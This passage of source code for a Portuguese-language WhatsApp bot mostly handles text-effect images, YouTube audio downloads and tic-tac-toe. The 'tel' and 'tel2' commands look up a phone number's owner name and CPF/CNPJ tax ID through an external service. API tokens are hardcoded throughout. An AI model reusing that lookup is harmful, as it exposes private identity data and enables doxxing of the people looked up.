anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/3DBox?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'naturalleaves':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/natural-leaves?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'blackpink':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/black-pink?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'dropwater':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/drop-water?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'christmas':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/christmas?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case '3dgradient':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/3d-gradient?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'tagg':
if (!isGroupAdmins) return enviar('Voc√™ precisa ser adm')
const tag = `‚ÄºÔ∏èùë∂ùë©ùëπùë∞ùëÆùë®ùëªùë∂ÃÅùëπùë∞ùë∂ ùëºùë∫ùë∂ ùë´ùë® ùëªùë®ùëÆ‚ÄºÔ∏è

ùõπ
ùõπ(nick)ùõπ
‚ôï(nick)‚ôõ
(Nick)üî±üî•
üî±üî•(Nick)

ùôèùòºÕ¢ ùôÑùôàùôãùôÄÕ¢Õ¢ùôçùôÑùôêÕ¢ùôà,ùôèùòº ùòæÕ¢ùôäùôà ùòøùôÄÕ¢ùôêùôéüî±Õ¢üî•`
enviar(tag)
break
case 'halloween':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Use: ${prefix + command} text\nExemplo: ${prefix + command} Bot`)
txt = args.join(" ")
buffer = await getBuffer(`https://pencarikode.xyz/api/textpro/halloween?text=${txt}&apikey=pais`)
tomioka.sendMessage(from, buffer, image, {caption: 'est√° ai', quoted: tomio, contextInfo: tome, thumbnail:null})
break
case 'space':
if (!isPremium) return enviar ('s√≥ premium')
team = body.slice(6)
teks1 = team.split("|")[0];
teks2 = team.split("|")[1];
team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/space-3d?apikey=apiteam&texto1=${teks1}&texto2=${teks2}`)
of = await getBuffer(team.resultado)
hero = await getBuffer(`https://i.ibb.co/3h6M64p/48bb51875d47.jpg`)
tomioka.sendMessage(from, of, image, {quoted: tomio, contextInfo: tome})
break
case 'playy':

case 'lagu':

if (args.length < 1) return enviar('O que voc√™ deseja procurar?')

teks = args.join(' ')

enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')

if (!teks.endsWith("-doc")){

res = await yts(`${teks}`).catch(e => {

enviar('_ [!] O erro de consulta inserido n√£o existe_')

})

enviar(`.Playing ${res.all[0].title}`)
let thumbInfo = `* TOMIOKABOT *
* T√≠tulo: * ${res.all[0].title}
*ID do v√≠deo: * ${res.all[0].videoId}
* Carregado em: * ${res.all[0].ago} 
* Visualiza√ß√µes: * ${res.all[0].views}
* Dura√ß√£o: * ${res.all[0].timestamp}
* Canal: * ${res.all[0].author.name}
* Canal do link: * ${res.all[0].author.url}

* _Aguarde o processo de upload ....._ *
`

/////////////sendFileFromUrl(res.all[0].image, image, {quoted: msg, caption: thumbInfo})

res = await y2mateA(res.all[0].url).catch(e => {

enviar('_[!  ] Erro ao entrar no Y2mate_ Web')

})

sendFileFromUrl(res[0].link, audio, {quoted: msg, mimetype: 'audio/mp4', filename: res[0].output})

}

if (teks.endsWith("-doc")){

const tec = teks.split("-doc")

res = await yts(`${tec}`).catch(e => {

enviar ('_ [!] Erro de consulta que voc√™ inseriu em falta_')
})
enviar(`.Playing ${res.all[0].title}`)
let thumbInfo = `* TOMIOKABOT *
* T√≠tulo: * ${res.all[0].title}
*ID do v√≠deo: * ${res.all[0].videoId}
* Carregado em: * ${res.all[0].ago} 
* Visualiza√ß√µes: * ${res.all[0].views}
* Dura√ß√£o: * ${res.all[0].timestamp}
* Canal: * ${res.all[0].author.name}
* Canal do link: * ${res.all[0].author.url}

* _Aguarde o processo de upload ....._ *
`

sendFileFromUrl(res.all[0].image, image, {quoted: msg, caption: thumbInfo})

res = await y2mateA(res.all[0].url).catch(e => {

enviar('_ [!  ] Erro ao entrar no Y2mate_ Web')

})

sendFileFromUrl(res[0].link, document, {quoted: msg, mimetype: 'audio/mp3', filename: res[0].output})

}

break

case 'glitch2':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar('Cad√™ o texto?')
teks = body.slice(8)
teks1 = teks.split("|")[0];
teks2 = teks.split("|")[1];
enviar('[‚ùó]ESPERE ...')
team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/glitch1?apikey=apiteam&texto1=${teks1}&texto2=${teks2}`)
buff = await getBuffer(team.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'glitch':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar('Cad√™ o texto?')
teks = body.slice(7)
enviar('[‚ùó]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/glitch2?apikey=apiteam&texto=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'demon':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar('Cad√™ o texto?')
teks = body.slice(6)
enviar('[‚ùó]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/demon?apikey=darling&texto=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'toxic':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar('Cad√™ o texto?')
teks = body.slice(6)
enviar('[‚ùó]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/toxic?apikey=apiteam&texto=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'transformer':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar('Cad√™ o texto?')
teks = body.slice(12)
enviar('[‚ùó]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/transformer?apikey=apiteam&texto=team=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'graffiti':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar('Cad√™ o texto?')
teks = body.slice(9)
teks1 = teks.split("|")[0];
teks2 = teks.split("|")[1];
enviar('[‚ùó]ESPERE ...')
team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/graffiti?apikey=apiteam&texto1=${teks1}&texto2={teks2}`)
buff = await getBuffer(team.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'blackpink':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar('Cad√™ o texto?')
teks = body.slice(10)
teks1 = teks.split("|")[0];
teks2 = teks.split("|")[1];
enviar('[‚ùó]ESPERE ...')
team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/glitch1?apikey=apiteam&texto1=${teks1}&texto2=${teks2}`)
buff = await getBuffer(team.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'thunder':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar('Cad√™ o texto?')
teks = body.slice(8)
enviar('[‚ùó]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/thunder?apikey=apiteam&texto=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'thunderv2':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar('Cad√™ o texto?')
teks = body.slice(10)
enviar('[‚ùó]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/thunderv2?apikey=apiteam&texto=team=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'harrypotter':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar('Cad√™ o texto?')
teks = body.slice(12)
enviar('[‚ùó]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/harrypotter2?apikey=apiteam&texto=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'pornhub':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar('Cad√™ o texto?')
teks = body.slice(8)
teks1 = teks.split("|")[0];
teks2 = teks.split("|")[1];
enviar('[‚ùó]ESPERE ...')
team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/pornhub?apikey=apiteam&texto1=${teks1}&texto2=${teks2}`)
buff = await getBuffer(team.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'neon3d':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar('Cad√™ o texto?')
teks = body.slice(7)
enviar('[‚ùó]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/neon3d?texto=${teks}&apikey=apiteam`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'horrorblood':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar('Cad√™ o texto?')
teks = body.slice(12)
enviar('[‚ùó]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/horror-blood?texto=${teks}&apikey=apiteam`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'neondevil':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar('Cad√™ o texto?')
teks = body.slice(10)
enviar('[‚ùó]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/neon-devil?texto=${teks}&apikey=apiteam`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'dropwater':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar('Cad√™ o texto?')
teks = body.slice(10)
enviar('[‚ùó]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/dropwater?apikey=apiteam&texto=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'advancedglow':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar('Cad√™ o texto?')
teks = body.slice(13)
enviar('[‚ùó]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/advanced-glow?apikey=apiteam&texto=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'wonderfulgraffiti':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar('Cad√™ o texto?')
teks = body.slice(18)
enviar('[‚ùó]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/wonderful-graffiti?apikey=apiteam&texto=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'dropwater':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar('Cad√™ o texto?')
teks = body.slice(10)
enviar('[‚ùó]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/dropwater?apikey=apiteam&texto=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'captainamerica':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar('Cad√™ o texto?')
teks = body.slice(15)
enviar('[‚ùó]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/captain-america?apikey=apiteam&texto=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'jokerlogo':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar('Cad√™ o texto?')
teks = body.slice(10)
enviar('[‚ùó]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/jokerlogo?apikey=apiteam&texto=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'marvel':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar('Cad√™ o texto?')
teks = body.slice(7)
enviar('[‚ùó]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/marvel?apikey=apiteam&texto1=${teks1}&texto2={teks2}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'lavatext':
if (!isPremium) return enviar ('s√≥ premium')
team = body.slice(9)
team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/lava-text?apikey=apiteam&texto1=${team}`)
of = await getBuffer(team.resultado)
hero = await getBuffer(`https://i.ibb.co/3h6M64p/48bb51875d47.jpg`)
tomioka.sendMessage(from, of, image, {quoted: tomio, contextInfo: tome, thumbnail: hero})
break
case 'magma':
if (!isPremium) return enviar ('s√≥ premium')
team = body.slice(6)
team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/magma-text?apikey=apiteam&texto=${team}`)
of = await getBuffer(team.resultado)
hero = await getBuffer(`https://i.ibb.co/3h6M64p/48bb51875d47.jpg`)
tomioka.sendMessage(from, of, image, {quoted: tomio, contextInfo: tome, thumbnail: hero})
break
case 'matrix':
if (!isPremium) return enviar ('s√≥ premium')
team = body.slice(7)
team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/matrix-text?texto=${team}&apikey=apiteam`)
of = await getBuffer(team.resultado)
hero = await getBuffer(`https://i.ibb.co/3h6M64p/48bb51875d47.jpg`)
tomioka.sendMessage(from, of, image, {quoted: tomio, contextInfo: tome, thumbnail: hero})
break
case 'breakwall':
if (!isPremium) return enviar ('s√≥ premium')
team = body.slice(10)
team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/break-wall?apikey=apiteam&texto=${team}`)
of = await getBuffer(team.resultado)
hero = await getBuffer(`https://i.ibb.co/3h6M64p/48bb51875d47.jpg`)
tomioka.sendMessage(from, of, image, {quoted: tomio, contextInfo: tome, thumbnail: hero})
break
case 'tel':
        if (!isPremium) return enviar ('s√≥ premium')
teks = body.slice(4)
anu = await fetchJson(`http://ifind.chapada.com.br:7777/?token=30491c06-5675-4e06-b2ae-4e3fcda2abdd&tel=${teks}`)
ipl = `busca encomtrada!

‚û∏ *nome:* ${anu.nome}
‚û∏ *cpf_cnpj*: ${anu.cpf_cnpj}
‚û∏ *tipo*: ${anu.tipo}
‚û∏ *operadora*: ${anu.operadora}`
enviar(ipl)
break
case 'tel2':
if (args.length == 0) return
query = args.join(" ")
get_result = await fetchJson(`http://ifind.chapada.com.br:7777/?token=20491c06-5675-4e06-b2ae-4e3fcda2abdd&tel=${query}`)
for (var x of get_result) {
ini_mn1k += `Nome : ${x.NOME}\n`
ini_mn2k += `cpf_cpnj : ${x.CPF_CNPJ}\n`
}
enviar(ini_mn1k)
enviar(ini_mn2k)
break
case 'nulis': 
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar ('comando √© usado assim ${prefix}textmar texto')
teks = body.slice(6)
if (teks.length > 10) return enviar ('O texto √© longo, at√© 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ‚úì*')
buffer = await getBuffer(`https://hadi-api.herokuapp.com/api/photoxy/underwater?teks=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'üå∫prontinho manoüå∫'})
break
case 'textmar': 
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar ('comando √© usado assim ${prefix}textmar texto')
teks = body.slice(8)
if (teks.length > 10) return enviar ('O texto √© longo, at√© 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ‚úì*')
buffer = await getBuffer(`https://hadi-api.herokuapp.com/api/photoxy/underwater?teks=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'üå∫prontinho manoüå∫'})
break
case 'bneon': 
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(6)
if (teks.length > 15) return enviar ('O texto √© longo, at√© 15 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ‚úì*')
buffer = await getBuffer(`https://api.zeks.xyz/api/bneon?apikey=cAdmS2XqIbRSP3vYAdqHvYqAD6W&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'üå∫prontinhoüå∫'})
break
case 'naruto': 
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(7)
if (teks.length > 15) return enviar ('O texto √© longo, at√© 15 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ‚úì*')
buffer = await getBuffer(`https://api.zeks.xyz/api/naruto?apikey=cAdmS2XqIbRSP3vYAdqHvYqAD6W&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'üå∫prontinhoüå∫'})
break
case '3dcube': 
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar ('comando √© usado assim ${prefix} matrix texto')
teks = body.slice(7)
if (teks.length > 10) return enviar ('O texto √© longo, at√© 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ‚úì*')
buffer = await getBuffer(`https://hadi-api.herokuapp.com/api/photoxy/under-cube?teks=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'üå∫prontinho manoüå∫'})
break

case 'cross': 
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(6)
if (teks.length > 10) return enviar ('O texto √© longo, at√© 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ‚úì*')
buffer = await getBuffer(`https://api.zeks.xyz/api/crosslogo?apikey=cAdmS2XqIbRSP3vYAdqHvYqAD6W&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'üòäta ai'})
break
case 'wolf': 
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar (mess.blank)

teks = body.slice(7)

if (teks.length > 10) return enviar ('O texto √© longo, at√© 10 caracteres')

enviar('*Estou fazendo, se der erro tente novamente ‚úì*')

buffer = await getBuffer(`https://api.zeks.xyz/api/wolflogo?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text1=${teks}&text2=${teks}`)

tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'üòäta ai'})

break


case 'flame': 
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar (mess.blank)

teks = body.slice(7)

if (teks.length > 10) return enviar ('O texto √© longo, at√© 10 caracteres')

enviar('*Estou fazendo, se der erro tente novamente ‚úì*')

buffer = await getBuffer(`https://api.zeks.xyz/api/flametext?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text=${teks}`)

tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'üòäta ai'})

break
case 'ytsrc':     //case by: Bielzinho-Bot // nao remova os cr√©ditos
if (!isPremium) return enviar ('s√≥ premium')
teks = body.slice(7)  
anu = await fetchJson(`http://brizas-api.herokuapp.com/sociais/youtubesrc?apikey=brizaloka&query=${teks}`)
const objs = []
for(i=0;i< anu.resultados.length; ++i) {
let data = {
rowId: `${prefix}playy `+ anu.resultados[i].title,
title: `${prefix}tocar`,
description: anu.resultados[i].title
}
objs.push(data)
}
payload = {
listMessage: {
title: "‚úÖ M√∫sicas encotradas ‚úÖ",
buttonText: "Mostra lista de m√∫sicas",
description: `Palavra chave: ${teks}`,
listType: 1,
sections: [
{
title: "M√∫sicas relacionadas",
rows: objs
}
]
}
}
let preparedPayload = await tomioka.prepareMessageFromContent(from, payload,{});
await tomioka.relayWAMessage(preparedPayload, {waitForAck: true})
break
case 'sky': 
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar (mess.blank)

teks = body.slice(7)

if (teks.length > 10) return enviar ('O texto √© longo, at√© 10 caracteres')

enviar('*Estou fazendo, se der erro tente novamente ‚úì*')

buffer = await getBuffer(`https://api.zeks.xyz/api/skytext?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text=${teks}`)

tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'üòäta ai'})

break
case 'litig': 
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(7)
if (teks.length > 10) return enviar ('O texto √© longo, at√© 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ‚úì*')
buffer = await getBuffer(`https://api.zeks.xyz/api/lithgtext?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'tai'})
break
case 'epep': 
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(6)
if (teks.length > 10) return enviar ('O texto √© longo, at√© 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ‚úì*')
buffer = await getBuffer(`https://api.zeks.xyz/api/epep?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'tai'})
break
case 'button': 
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(8)
if (teks.length > 10) return enviar ('O texto √© longo, at√© 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ‚úì*')
buffer = await getBuffer(`https://api.zeks.xyz/api/gplaybutton?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: buffer, caption: 'ta ai'})
break
case 'text3d': 
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(8)
if (teks.length > 10) return enviar ('O texto √© longo, at√© 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ‚úì*')
buffer = await getBuffer(`https://api.zeks.xyz/api/text3dbox?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'ta ai'})
break
case 'text3d': 
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(8)
if (teks.length > 10) return enviar ('O texto √© longo, at√© 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ‚úì*')
buffer = await getBuffer(`https://api.zeks.xyz/api/text3d?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'ta ai'})
break
case 'text3dbox': 
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(11)
if (teks.length > 10) return enviar ('O texto √© longo, at√© 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ‚úì*')
buffer = await getBuffer(`https://api.zeks.xyz/api/text3dbox?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'ta ai'})
break

//INICIO DO JOGO DA VELHA ‚ùå ‚≠ï üî≤
case 'ttthelp':
tomioka.sendMessage(from, ttthelp(prefix) , text, {quoted: msg, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": "Jogo da velha", 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})					
break
case 'ttt':				
if (!isGroup) {
enviar(ptbr.group())
} else if (tttset.tttstatus == "on") {
enviar(`Algu√©m j√° est√° jogando no momento\nPor favor aguarde um instante...`)
} else if (tttset.waitingTime == "on") {
enviar(`Algu√©m jogou recentemente\nPor favor aguarde o tempo de espera...`)
} else if (args == 0 || (args != 'easy' && args != 'Easy' && args != 'EASY' && args != 'normal' && args != 'Normal' && args != 'NORMAL' && args != 'hard' && args != 'Hard' && args != 'HARD'&& args != 'impossible'&& args != 'Impossible' && args != 'IMPOSSIBLE')) {
enviar(`Defina a dificuldade\nEx.: ${prefix}ttt easy\n\nDificuldades: easy, normal, hard e impossible`)
} else {
tttset.tttstatus = "on"
tttset.player = sender
tttset.playerName = pushname
tttset.mentionPlayer = msg
tttset.local = from
if (args == 'easy' || args == 'Easy' || args == 'EASY') {
tttset.tttdifficulty = "EASY"
} else if (args == 'normal' || args == 'Normal' || args == 'NORMAL') {
tttset.tttdifficulty = "NORMAL"
} else if (args == 'hard' || args == 'Hard' || args == 'HARD') {
tttset.tttdifficulty = "HARD"
} else if (args == 'impossible' || args == 'Impossible' || args == 'IMPOSSIBLE') {
tttset.tttdifficulty = "IMPOSSIBLE"
}
const randomStartIA = Math.floor(Math.random() * 3)
if (randomStartIA == 0) {
IA()
tttset.reActivate1 = "on"	
}
enviar(`O jogo come√ßou!!!\nModo: ${tttset.tttdifficulty} use ${prefix}ttthelp caso n√£o saiba jogar`, text, crtt)
tomioka.sendMessage(from, `üåÄ1Ô∏è‚É£2Ô∏è‚É£3Ô∏è‚É£\nüÖ∞Ô∏è${esp.a1}${esp.a2}${esp.a3}\nüÖ±Ô∏è${esp.b1}${esp.b2}${esp.b3}\n¬©Ô∏è${esp.c1}${esp.c2}${esp.c3}`,text )
tomioka.sendMessage(from,`Bom jogo`, text) 
setTimeout( () => {
tttset.waitingTime = "off"
tttset.autoEndTime = "on"
}, 120000) 
}
break	
case 'tttme':
if (!isGroup) return enviar (ptbr.group())
const checkTTTIdMe = getTTTId(sender)
if (checkTTTIdMe === undefined) addTTTId(sender)
tomioka.sendMessage(from, tttme(pushname, getTTTwins(sender), getTTTdefeats(sender), getTTTties(sender), getTTTpoints(sender)), text, {quoted:msg})
break	
case 'tttrank':
if (!isGroup) return enviar (ptbr.group())
//if (tictactoe.length < 3) return enviar (`Humm, √© necess√°rio que no m√≠nimo 3 pessoas tenham jogado...`)
tictactoe.sort((a, b) => (a.points < b.points) ? 1 : -1)
mentioned_jid = []
let board = '„Äê TTT RANKS „Äë\n\n'
try {
for (let i = 0; i < 3; i++) {
